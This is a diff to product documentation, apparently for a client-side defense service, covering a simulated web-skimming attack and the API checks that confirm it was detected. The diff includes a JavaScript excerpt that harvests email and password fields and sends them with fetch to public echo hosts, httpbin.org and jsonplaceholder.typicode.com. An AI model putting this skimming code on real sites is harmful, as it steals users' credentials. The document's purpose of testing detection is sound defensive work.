@@ -85,8 +85,8 @@ var _poll = _si(function() {
         type: 'combined_demo', credentials: harvested,
         page: window.location.href, timestamp: Date.now()
       });
-      _fetch('https://httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to httpbin.org'); });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
@@ -131,7 +131,7 @@ Operators without browser automation tools perform the steps manually:
 | --- | --- | --- |
 | Form field harvesting | Reads email and password input values | Scripts reading sensitive form fields — flagged High Risk |
 | Script injection | Injects 4 `&lt;script&gt;` tags from `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | 4 new third-party script domains detected |
-| Data exfiltration | Sends harvested data via `fetch` to `httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains |
+| Data exfiltration | Sends harvested data via `fetch` to `www.httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains |
 
 <Aside type="tip">
 After running the attack simulation, use this deterministic polling loop to wait for detections:
@@ -165,7 +165,7 @@ If the HTTPS LB certificate is valid (`CertificateValid`), you may optionally ru
 Query the CSD API endpoints to confirm detections appeared. Use the polling loop: query `/detected_domains` every 60 seconds; proceed as soon as DET-3 passes. If DET-3 does not pass after 10 minutes, check CSD configuration. If DET-3 does not pass after 30 minutes, stop and report to operator. These endpoints are documented in the [API Reference](/csd/api-reference/) and use the same authentication and namespace as previous steps.
 
 <Aside type="note">
-**Endpoint processing order:** `/detected_domains` is populated first and is the primary indicator that the CSD pipeline is working. `/scripts` and `/formFields` are populated on a slower backend processing schedule and may remain empty for 20–30 minutes even after multiple simulation runs. If `/detected_domains` shows exfil domains (`httpbin.org`, `jsonplaceholder.typicode.com`), treat the simulation as successfully detected and proceed — the DET-1 check below reflects this.
+**Endpoint processing order:** `/detected_domains` is populated first and is the primary indicator that the CSD pipeline is working. `/scripts` and `/formFields` are populated on a slower backend processing schedule and may remain empty for 20–30 minutes even after multiple simulation runs. If `/detected_domains` shows exfil domains (`www.httpbin.org`, `jsonplaceholder.typicode.com`), treat the simulation as successfully detected and proceed — the DET-1 check below reflects this.
 </Aside>
 
 ### Detected Scripts
@@ -180,13 +180,13 @@ curl -s -X POST \
   -H "Content-Type: application/json" \
   -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
   "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
-  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {url: .url, host: .host, risk: .risk}]}'
+  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
 ```
 
 | Field | Expected | Status |
 | --- | --- | --- |
 | `total` | &gt; 0 (scripts detected) | PASS if &gt; 0; PENDING if 0 but `/detected_domains` shows exfil domains |
-| Script hosts | Includes `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | PASS if injected CDN domains appear |
+| Script names | Includes CDN domains (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) in `script_name` | PASS if injected CDN domains appear |
 
 ### Detected Domains
 
@@ -226,7 +226,7 @@ After all detection queries, present the final detection status:
 | --- | --- | --- |
 | DET-1 | Scripts detected (`/scripts` endpoint) | PASS if &gt; 0; PENDING if empty but DET-3 passes |
 | DET-2 | CDN domains detected | PASS / FAIL |
-| DET-3 | Exfil domains detected (`/detected_domains`) | **Primary indicator** — PASS if `httpbin.org` or `jsonplaceholder.typicode.com` appear |
+| DET-3 | Exfil domains detected (`/detected_domains`) | **Primary indicator** — PASS if `www.httpbin.org` or `jsonplaceholder.typicode.com` appear |
 | DET-4 | Form fields detected (`/formFields` endpoint) | PASS if &gt; 0; PENDING if empty but DET-3 passes |
 
 <Aside type="note">
